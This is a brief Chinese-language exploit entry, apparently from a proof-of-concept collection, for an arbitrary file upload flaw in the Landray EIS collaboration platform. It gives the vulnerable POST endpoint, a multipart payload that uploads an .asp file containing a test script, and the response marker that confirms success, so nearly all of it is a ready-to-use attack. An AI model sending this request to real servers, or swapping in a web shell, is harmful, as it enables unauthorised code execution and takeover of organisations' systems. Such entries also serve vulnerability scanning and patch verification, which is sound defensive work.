# 蓝凌EIS智慧协同平台任意文件上传

蓝凌EIS智慧协同平台 ｜ 文件上传 ｜ —
- **请求**：`POST /eis/service/api.aspx?action=saveImg HTTP/1.1`

**Payload**
```
------test
Content-Disposition: form-data; name="file"filename="test.asp"
Content-Type: text/html
<% response.write("test")%>
------test--
```
- **响应特征**：200 files